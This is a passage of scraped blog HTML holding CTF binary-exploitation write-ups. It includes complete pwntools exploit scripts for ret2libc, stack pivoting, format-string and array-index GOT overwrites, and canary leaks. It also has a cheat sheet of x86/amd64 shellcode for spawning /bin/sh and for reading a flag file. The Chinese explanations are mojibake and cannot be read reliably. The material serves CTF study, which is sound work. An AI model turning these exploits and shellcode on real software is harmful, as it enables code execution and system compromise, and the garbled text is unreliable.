text_base = re - 0x146F
print(&amp;quot;base = &amp;quot;,hex(text_base))

sys = text_base + 0x1231

payload = b&#39;a&#39;*56 + p64(can) + p64(0xdeadbeef) + p64(sys)
p.sendlineafter(&amp;quot;else? &amp;quot;,payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå¦‚ä¸‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707568652743.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;attæ ¼å¼åŒ–å­—ç¬¦ä¸²&#34;&gt;att(æ ¼å¼åŒ–å­—ç¬¦ä¸²)&lt;/h1&gt;
&lt;p&gt;æŸ¥ä¸‹ä¿æŠ¤ï¼ŒåŒæ ·å…¨å¼€&lt;br&gt;
çœ‹ä¸‹åç§»&lt;br&gt;
ç¬¬20ä¸ªå‚æ•°å¯ä»¥æ³„éœ²ç¨‹åºçœŸå®åœ°å€ï¼Œä»è€Œæ‰¾åˆ°printfçš„gotè¡¨å®é™…ï¼Œåœ°å€ç¬¬21ä¸ªå‚æ•°ä¸º__libc_start_call_main+122ï¼Œå¯ä»¥å€Ÿæ­¤æ³„éœ²libcåŸºåœ°å€ï¼Œå†å°†printfå‡½æ•°gotè¡¨åœ°å€æ”¹ä¸ºsystem&lt;br&gt;
expå¦‚ä¸‹ï¼ˆå¯èƒ½ä¸€æ¬¡æ‰“ä¸è¿‡å»ï¼Œå› ä¸ºæ˜¯ç”¨fmtstrè‡ªåŠ¨ç”Ÿæˆçš„å¯åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ¯æ¬¡è¿è¡Œåœ°å€ä¸åŒï¼Œç”Ÿæˆçš„payloadé•¿åº¦ä¹Ÿä¸åŒï¼Œreadé•¿åº¦é™åˆ¶åœ¨0x64ï¼Œå¤šè¯•å‡ æ¬¡å°±èƒ½æ‰“é€šï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./att&amp;quot;)
elf = ELF(&amp;quot;./att&amp;quot;)

#gdb.attach(p)

sem = b&amp;quot;say: &amp;quot;
p.sendafter(sem,b&amp;quot;%19$p-%20$p-%21$p&amp;quot;)

p.recvuntil(&amp;quot;0x&amp;quot;)
can = int(p.recv(16),16)
print(&amp;quot;can = &amp;quot;,hex(can))

re = int(p.recv(15)[3:],16)
print(&amp;quot;re = &amp;quot;,hex(re))

text_base = re - 0xaa0
print(&amp;quot;text_base = &amp;quot;,hex(text_base))

__libc_start_main = int(p.recv(15)[3:],16) - 240
print(&amp;quot;__libc_start_main = &amp;quot;,hex(__libc_start_main))
libc_base = __libc_start_main - 0x20740

sys = libc_base + 0x45380

printf_got = text_base + 0x201030
print(&amp;quot;sys = &amp;quot;,hex(sys))

pay = fmtstr_payload(6,{printf_got : sys})
p.sendlineafter(sem,pay)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå¦‚ä¸‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707572802862.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn&#34;&gt;pwn&lt;/h1&gt;
&lt;p&gt;æŸ¥ä¸‹ä¿æŠ¤ï¼Œæ²¡å¼€PIEï¼Œå…¶ä»–å…¨å¼€&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707578740105.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æŸ¥çœ‹ç¨‹åºé€»è¾‘ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ç„¶ååˆ¤æ–­v5å’Œv4ç›¸ç­‰ä¹‹åæœ‰ä¸€ä¸ªæ ˆæº¢å‡º&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707579064182.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°0x7fffffffddf8å­˜æ”¾ç€æŒ‡å‘0x22bçš„0x7fffffffdde8ï¼Œå¯ä»¥é€šè¿‡&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;%*8$c%9$hn
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å®ç°ç»•è¿‡ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­&#39;*&#39;çš„ä½œç”¨ï¼Œç›´æ¥æ”¹å€¼ä¹Ÿè¡Œï¼‰&lt;br&gt;
åœ¨åŠ¨æ€è°ƒè¯•ä¸‹å‘ç°vulnå‡½æ•°ä¸­çš„cannaryå’Œmainå‡½æ•°ä¸€æ ·ï¼Œcanaryæ˜¯ç¬¬15ä¸ªå‚æ•°ï¼Œå¯ä»¥é¡ºä¾¿æ³„éœ²æ‰ï¼Œåˆ°äº†vulnå‡½æ•°åå°±æ˜¯æ™®é€šçš„ret2libcäº†ï¼Œé¡ºä¾¿å­¦åˆ°äº†recvçš„ä¸€ç§è¯»å–æ–¹æ³•&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;canary = int(p.recvuntil(b&#39;.&#39;, drop = True)  ,16)#è®¾ç½®äº†dropå‚æ•°ä¸ºTrueï¼Œè¡¨ç¤ºè¯»å–åˆ°&#39;.&#39;åä¼šå°†&#39;.&#39;ä»è¾“å…¥æµä¸­ä¸¢å¼ƒ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./pwn&amp;quot;)
elf = ELF(&amp;quot;./pwn&amp;quot;)
libc = ELF(&amp;quot;./libc-2.31.so&amp;quot;)

#gdb.attach(p)

pay = b&#39;%*8$c%9$hn-%15$p&#39;
p.sendafter(b&amp;quot;Toka\n\n&amp;quot;, pay)
 
p.recvuntil(b&#39;0x&#39;)
#canary = int(p.recvuntil(b&#39;.&#39;, drop = True)  ,16)#è®¾ç½®äº†dropå‚æ•°ä¸ºTrueï¼Œè¡¨ç¤ºè¯»å–åˆ°&#39;.&#39;åä¼šå°†&#39;.&#39;ä»è¾“å…¥æµä¸­ä¸¢å¼ƒ
canary = int(p.recv(16)  ,16)
print(&amp;quot;canary = &amp;quot;,canary)
 
pop_rdi = 0x4013f3
vuln = 0x40125d
 
pay = b&#39;A&#39;*40 + p64(canary) + p64(0x404800) + p64(pop_rdi) + p64(elf.got[&#39;puts&#39;]) + p64(elf.plt[&#39;puts&#39;]) + p64(vuln)
p.sendlineafter(b&amp;quot;level\n\n&amp;quot;, pay)
 
libc_base = u64(p.recv(6).ljust(8, b&#39;\x00&#39;)) - libc.sym[&#39;puts&#39;]


sh = libc_base + next(libc.search(b&#39;/bin/sh&#39;))
sys = libc_base + libc.sym[&#39;system&#39;]
ret = 0x40101a
 
pay = b&#39;A&#39;*40 + p64(canary) + p64(0x404800) + p64(ret) + p64(pop_rdi) + p64(sh) + p64(sys) + p64(vuln)
p.sendlineafter(b&amp;quot;I know you like him, but you must pass my level\n\n&amp;quot;, pay)
 
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå¦‚ä¸‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707579511079.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">2024.2.9</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/202428/"" data-c="
          &lt;h1 id=&#34;cnhz1&#34;&gt;cnhz1&lt;/h1&gt;
&lt;p&gt;æ™®é€šçš„ret2libc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./cnhz1&#39;)
elf = ELF(&#39;./cnhz1&#39;)

p.sendlineafter(&amp;quot;choice!\n&amp;quot;,b&#39;1&#39;)

puts_plt = 0x4006E0
gets_got = 0x602050
main_addr = 0x4009A0
pop_rdi_ret = 0x400c83
ret = 0x4006b9

#gdb.attach(p)

payload = b&#39;a&#39;*88+p64(pop_rdi_ret)+p64(gets_got)+p64(puts_plt)+p64(main_addr)
p.sendlineafter(&amp;quot;encrypted\n&amp;quot;,payload)

gets_addr=u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(gets_addr))

libc = LibcSearcher(&amp;quot;gets&amp;quot;,gets_addr)
libc_base = gets_addr - libc.dump(&amp;quot;gets&amp;quot;)
system_addr = libc_base + libc.dump(&amp;quot;system&amp;quot;)
bin_addr = libc_base + libc.dump(&amp;quot;str_bin_sh&amp;quot;)
# 6 - libc6_2.37-9_amd64

print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;sys = &amp;quot;,hex(system_addr))
print(&amp;quot;bin = &amp;quot;,hex(bin_addr))

#gdb.attach(p)
payload=b&#39;b&#39;*88+p64(ret)+p64(pop_rdi_ret)+p64(bin_addr)+p64(system_addr)
p.sendline(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå¦‚ä¸‹&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1707407190027.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;vulnæ ˆè¿ç§»&#34;&gt;vulnï¼ˆæ ˆè¿ç§»ï¼‰&lt;/h1&gt;
&lt;p&gt;å…ˆå°†ä¸‹è½½çš„libcæ–‡ä»¶é“¾æ¥åˆ°ç¨‹åº&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;patchelf --set-interpreter &#39;/home/gg/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&#39;  --set-rpath &#39;/home/gg/glibc-all-in-one/libs/2.23-0ubuntu3_amd64&#39;  &#39;/home/gg/Desktop/1/vuln&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;bss + 0x30 æ˜¯ä¸ºäº†é˜²æ­¢æ ˆç”Ÿé•¿è¿‡é«˜ï¼Œåˆ©ç”¨OnegadgetæŸ¥çœ‹å¯ç”¨åœ°å€,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./vuln&#39;)
elf = ELF(&#39;./vuln&#39;)
libc = ELF(&#39;./libc-2.23.so&#39;)

bss = 0x601080
leave_ret = 0x400699
vuln = 0x400656
pop_rdi_ret = 0x400703
read_got = 0x601028
puts_plt = 0x4004e0

payload = b&#39;a&#39; * 96 + p64(bss + 0x30) + p64(leave_ret)
p.sendafter(&amp;quot;want\n&amp;quot;,payload)

gdb.attach(p)

payload = cyclic(0x30) + p64(bss + 0x40) + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vuln)
p.sendafter(&amp;quot;now!\n&amp;quot;,payload)
#rsp = bss + 0x30  ,  rbp = bss + 0x40

read_addr = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(read_addr))

libc_base = read_addr - libc.symbols[&#39;read&#39;]
system_addr = libc_base + libc.symbols[&#39;system&#39;]
bin_addr = libc_base + next(libc.search(b&#39;/bin/sh&#39;))

print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;read = &amp;quot;,hex(libc.symbols[&#39;read&#39;]))

payload = b&#39;a&#39; * 0x60 + p64(0xdeadbeef) + p64(0x4525a + libc_base)
p.sendafter(&amp;quot;want\n&amp;quot;,payload)

#ç¬¬äºŒä¸ªreadåœ¨bssèµ·å§‹è¯»å–0x100ä¸ªæ•°æ®ï¼Œrbp = bss + 0x40
payload = b&#39;a&#39; * 0x40 + p64(0xdeadbeef) + p64(0x4525a + libc_base)#onegadgetds
p.sendafter(&amp;quot;now!\n&amp;quot;,payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå¦‚ä¸‹&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1707407196804.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;vulnæ•°ç»„æº¢å‡º&#34;&gt;vulnï¼ˆæ•°ç»„æº¢å‡ºï¼‰&lt;/h1&gt;
&lt;p&gt;é¦–å…ˆæ”¹ä¸‹libcæ–‡ä»¶&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;patchelf --set-interpreter &#39;/home/gg/Desktop/day1/0/ld-2.31.so&#39;  --set-rpath &#39;/home/gg/glibc-all-in-one/libs/2.31-0ubuntu9_amd64&#39; &#39;/home/gg/Desktop/day1/0/vuln&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1707407203345.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å‘ç°å¯ä»¥é€šè¿‡è¾“å…¥è´Ÿæ•°å®ç°ä»»æ„åœ°å€æ›´æ”¹ï¼Œé€‰æ‹©æ›´æ”¹gotè¡¨ï¼Œç”±äºåªæœ‰ä¸€æ¬¡ä¸èƒ½å®Œæˆæ³„éœ²libcåœ°å€å’Œæ‰§è¡Œsystemå‡½æ•°ï¼Œæ‰€ä»¥å…ˆå°†exitå‡½æ•°æ”¹ä¸ºvulnåœ°å€ï¼Œç”±äºå‡½æ•°å®é™…åœ°å€ä½ä¸‰ä½ä¸å˜æ‰€ä»¥å¯ä»¥é€šè¿‡ç¬¬äºŒæ¬¡æ³„éœ²libcåŸºåœ°å€ï¼Œä»è€Œå¾—åˆ°systemå®é™…åœ°å€ï¼Œç”±äºputs(&amp;amp;seats[16 * v0])ï¼Œæ‰€ä»¥å°†putså‡½æ•°gotè¡¨å­˜çš„å®é™…åœ°å€æ”¹ä¸ºsystemï¼Œå°†seat[16*v0]æ”¹ä¸º/bin/shä¾¿å¯æˆåŠŸæ‹¿åˆ°shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./vuln&amp;quot;)
elf = ELF(&amp;quot;./vuln&amp;quot;)
libc = ELF(&amp;quot;./libc-2.31.so&amp;quot;)

vuln = elf.sym[&amp;quot;vuln&amp;quot;]

p.sendlineafter(b&amp;quot;one.\n&amp;quot;, b&amp;quot;-6&amp;quot;)
p.sendafter(b&amp;quot;name\n&amp;quot;, p64(vuln))

p.sendlineafter(b&amp;quot;one.&amp;quot;, b&amp;quot;-8&amp;quot;)
p.sendafter(b&amp;quot;name&amp;quot;, b&amp;quot;\x50&amp;quot;)
p.recvuntil(b&amp;quot;is &amp;quot;)
setbuf = u64(p.recv(6).ljust(8, b&amp;quot;\x00&amp;quot;))
print(&amp;quot;setbuf = &amp;quot;,hex(setbuf))
print(&amp;quot;setbuf = &amp;quot;,hex(libc.sym[b&amp;quot;setbuf&amp;quot;]))

libc_base = setbuf - libc.symbols[b&amp;quot;setbuf&amp;quot;]
system_addr = libc_base + 0x55410

p.sendlineafter(b&amp;quot;one.&amp;quot;, b&amp;quot;-9&amp;quot;)
p.sendafter(b&amp;quot;name&amp;quot;, b&amp;quot;/bin/sh\x00&amp;quot; + p64(system_addr))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå¦‚ä¸‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707558751549.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">2024.2.8</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/huan-libc-yuan-yi-xie-shellcode-mo-ban-orw/"" data-c="
          &lt;h1 id=&#34;glibc-all-in-one&#34;&gt;glibc-all-in-one&lt;/h1&gt;
&lt;p&gt;åœ¨glibc-all-in-oneç›®å½•ä¸‹&lt;/p&gt;
&lt;h2 id=&#34;è·å–å¯ä¸‹è½½çš„libcåˆ—è¡¨&#34;&gt;è·å–å¯ä¸‹è½½çš„libcåˆ—è¡¨&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;cat list 
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;./download name
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æŸ¥çœ‹ç›®å‰é“¾æ¥ä¿¡æ¯&#34;&gt;æŸ¥çœ‹ç›®å‰é“¾æ¥ä¿¡æ¯&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;ldd -v æ–‡ä»¶å
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æ¢æº&#34;&gt;æ¢æº&lt;/h2&gt;
&lt;p&gt;ä¸‰ä¸ª[ ]åˆ†åˆ«å¯¹åº” ldæ–‡ä»¶åœ°å€ã€glibcæ–‡ä»¶å¤¹ã€é¢˜ç›®æ–‡ä»¶&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;patchelf --set-interpreter [~/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/ld-2.26.so] --set-rpath [~/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64] [./gundam]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;--set-rpath åé¢çš„åœ°å€æœ‰æ—¶å€™éœ€è¦åŠ ä¸Š â€œ / â€ æœ‰æ—¶å€™ä¸ç”¨&lt;/p&gt;
&lt;h3 id=&#34;åŸç†&#34;&gt;åŸç†&lt;/h3&gt;
&lt;p&gt;patchelf --set-rpath çš„ä½œç”¨æ˜¯ åœ¨ELFæ–‡ä»¶çš„ Dynamic section çš„ä¸­æ·»åŠ ä¸€ä¸ª RUNPATH æ®µé‡Œé¢å‚¨å­˜ç€åŠ¨æ€é“¾æ¥åº“çš„ç»å¯¹è·¯å¾„ï¼Œå³è®¾ç½®ç¨‹åºçš„åŠ¨æ€é“¾æ¥åº“&lt;/p&gt;
&lt;p&gt;patchelf --set-interpreter çš„ä½œç”¨æ˜¯ åœ¨ELFæ–‡ä»¶çš„ interp section è®¾ç½® interpreter é¡¹çš„å€¼ä¸º ldåŠ è½½å™¨ç»å¯¹è·¯å¾„ï¼Œå³è®¾ç½®ç¨‹åºçš„åŠ¨æ€é“¾æ¥åº“åŠ è½½å™¨&lt;/p&gt;
&lt;h4 id=&#34;å­¦ä¹ é“¾æ¥&#34;&gt;å­¦ä¹ é“¾æ¥&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://sf2333.github.io/2022/02/19/PWN%E9%A2%98%E6%9C%AC%E5%9C%B0%E6%9B%B4%E6%8D%A2libc%E7%8E%AF%E5%A2%83%E6%94%BB%E7%95%A5/&#34;&gt;https://sf2333.github.io/2022/02/19/PWNé¢˜æœ¬åœ°æ›´æ¢libcç¯å¢ƒæ”»ç•¥/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;onegadget&#34;&gt;Onegadget&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;one_gadget filename  #libcæ–‡ä»¶å
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;seccomp-tools&#34;&gt;seccomp-tools&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;export PATH=$PATH:/home/gg/.local/share/gem/ruby/3.1.0/bin
seccomp-tools dump ./vuln
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;shellcode&#34;&gt;shellcode&lt;/h1&gt;
&lt;h2 id=&#34;è¾ƒçŸ­çš„shellcode&#34;&gt;è¾ƒçŸ­çš„shellcode&lt;/h2&gt;
&lt;p&gt;i386ï¼ˆlen = 18ï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;push   0xb
pop    eax
push   ebx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
int    0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;amd64ï¼ˆlen = 22ï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;xor 	rsi,	rsi
push	rsi			
mov 	rdi,	0x68732f2f6e69622f
push	rdi
push	rsp
pop	rdi
mov 	al,	59
cdq
syscall
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æ²™ç›’ä¸‹æœ€çŸ­shellcode&#34;&gt;æ²™ç›’ä¸‹æœ€çŸ­shellcode&lt;/h2&gt;
&lt;h3 id=&#34;64ä½&#34;&gt;64ä½&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;shellcode=&#39;&#39;&#39;
	xor rax, rax   #xor rax,raxæ˜¯å¯¹raxçš„æ¸…é›¶è¿ç®—æ“ä½œ
	xor rdi, rdi   #æ¸…ç©ºrdiå¯„å­˜å™¨çš„å€¼
	xor rsi, rsi   #æ¸…ç©ºrsiå¯„å­˜å™¨çš„å€¼
	xor rdx, rdx
	mov rax, 2      #openè°ƒç”¨å·ä¸º2
	mov rdi, 0x67616c662f2e   #ä¸ºgalf/.ä¸º./flagçš„ç›¸å0x67616c662f2eä¸º/flagçš„ASCIIç çš„åå…­è¿›åˆ¶
	push rdi
	mov rdi, rsp
	syscall   #ç³»ç»Ÿè°ƒç”¨å‰ï¼Œlinuxåœ¨eaxå¯„å­˜å™¨é‡Œå†™å…¥å­åŠŸèƒ½å·ï¼Œæ–­æ­¢å¤„ç†ç¨‹åºæ ¹æ®eaxå¯„å­˜å™¨çš„å€¼æ¥åˆ¤æ–­ç”¨æˆ·è¿›ç¨‹ç”³è¯·å“ª	ç±»ç³»ç»Ÿè°ƒç”¨ã€‚
	mov rdx, 0x100   #sys_read(3,file,0x100)
	mov rsi, rdi
	mov rdi, rax
	mov rax, 0      #readè°ƒç”¨å·ä¸º0,0ä¸ºæ–‡ä»¶æè¿°ç¬¦ï¼Œå³å¤–éƒ¨è¾“å…¥ï¼Œä¾‹å¦‚é”®ç›˜
	syscall
	mov rdi, 1      #sys_write(1,file,0x30)
	mov rax, 1      #writeè°ƒç”¨å·ä¸º1,1ä¸ºæ–‡ä»¶æè¿°ç¬¦ï¼ŒæŒ‡çš„æ˜¯å±å¹•
	syscall
&#39;&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;32ä½&#34;&gt;32ä½&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;shellcode = &amp;quot;&amp;quot;&amp;quot;
/*open(./flag)*/
	push 0x1010101
	xor dword ptr [esp], 0x1016660
	push 0x6c662f2e
	mov eax,0x5
	mov ebx,esp
	xor ecx,ecx
	int 0x80
	/*read(fd,buf,0x100)*/
	mov ebx,eax
	mov ecx,esp
	mov edx,0x30
	mov eax,0x3
	int 0x80
	/*write(1,buf,0x100)*/
	mov ebx,0x1
	mov eax,0x4
	int 0x80
&amp;quot;&amp;quot;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;32ä½-2&#34;&gt;32ä½&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;b&#39;j\x0bXSh//shh/bin\x89\xe3\xcd\x80&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;push   0xb
pop    eax
push   ebx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
int    0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;64ä½-2&#34;&gt;64ä½&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;b&#39;H1\xf6VH\xbf/bin//shWT_\xb0;\x99\x0f\x05&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;xor 	rsi,	rsi
push	rsi
mov 	rdi,	0x68732f2f6e69622f
push	rdi
push	rsp	
pop	rdi	
mov 	al,	59	
cdq				
syscall
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;32ä½-çŸ­å­—èŠ‚shellcode-21å­—èŠ‚&#34;&gt;32ä½ çŸ­å­—èŠ‚shellcode â€“&amp;gt; 21å­—èŠ‚&lt;/h2&gt;
&lt;p&gt;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x8&lt;/p&gt;
&lt;h2 id=&#34;32ä½-çº¯asciiå­—ç¬¦shellcode&#34;&gt;32ä½ çº¯asciiå­—ç¬¦shellcode&lt;/h2&gt;
&lt;p&gt;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA&lt;/p&gt;
&lt;h2 id=&#34;32ä½-scanfå¯è¯»å–çš„shellcode&#34;&gt;32ä½ scanfå¯è¯»å–çš„shellcode&lt;/h2&gt;
&lt;p&gt;\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh&lt;/p&gt;
&lt;h2 id=&#34;64ä½-scanfå¯è¯»å–çš„shellcode-22å­—èŠ‚&#34;&gt;64ä½ scanfå¯è¯»å–çš„shellcode 22å­—èŠ‚&lt;/h2&gt;
&lt;p&gt;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&lt;/p&gt;
&lt;h2 id=&#34;64ä½-è¾ƒçŸ­çš„shellcode-23å­—èŠ‚&#34;&gt;64ä½ è¾ƒçŸ­çš„shellcode 23å­—èŠ‚&lt;/h2&gt;
&lt;p&gt;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&lt;/p&gt;
&lt;h2 id=&#34;64ä½-çº¯asciiå­—ç¬¦shellcode&#34;&gt;64ä½ çº¯asciiå­—ç¬¦shellcode&lt;/h2&gt;
&lt;p&gt;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&lt;/p&gt;
&lt;h1 id=&#34;orw&#34;&gt;ORW&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;fd = open(&#39;/flag&#39;,&#39;r&#39;)
read(fd,buf,len)
write(1,buf,len)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;fdä¸€èˆ¬ä¸º3ï¼Œå› ä¸ºopenè¿”å›çš„æ–‡ä»¶æè¿°ç¬¦æ˜¯å¯ç”¨æ–‡ä»¶æè¿°ç¬¦ä¸­æœ€å°çš„é‚£ä¸€ä¸ªï¼Œæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶è‡ªåŠ¨æ‰“å¼€0ï¼Œ1ï¼Œ2ï¼Œå¯¹åº”ç€æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€æ ‡å‡†æŠ¥é”™ï¼Œæ‰€ä»¥readçš„æ–‡ä»¶æè¿°ç¬¦åº”è¯¥æ˜¯3&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;openopen64å‡½æ•°&#34;&gt;openï¼ˆopen64ï¼‰å‡½æ•°&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;int open(const char *path, int access, int mode);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‚æ•°è§£é‡Šï¼š&lt;/p&gt;
&lt;p&gt;pathï¼šè¦æ‰“å¼€çš„æ–‡ä»¶è·¯å¾„å’Œåç§°ã€‚&lt;/p&gt;
&lt;p&gt;accessï¼šè®¿é—®æ¨¡å¼ï¼Œå®å®šä¹‰å’Œå«ä¹‰å¦‚ä¸‹ï¼š&lt;br&gt;
â€“ O_RDONLYï¼ˆ0ï¼‰ï¼šåªè¯»æ‰“å¼€ï¼›&lt;br&gt;
â€“ O_WRONLYï¼ˆ1ï¼‰ï¼šåªå†™æ‰“å¼€ï¼›&lt;br&gt;
â€“ O_RDWRï¼ˆ2ï¼‰ï¼šè¯»å†™æ‰“å¼€ï¼›&lt;br&gt;
è¿˜å¯é€‰æ‹©ä»¥ä¸‹æ¨¡å¼ä¸ä»¥ä¸Š3ç§åŸºæœ¬æ¨¡å¼ç›¸ä¸ï¼š&lt;br&gt;
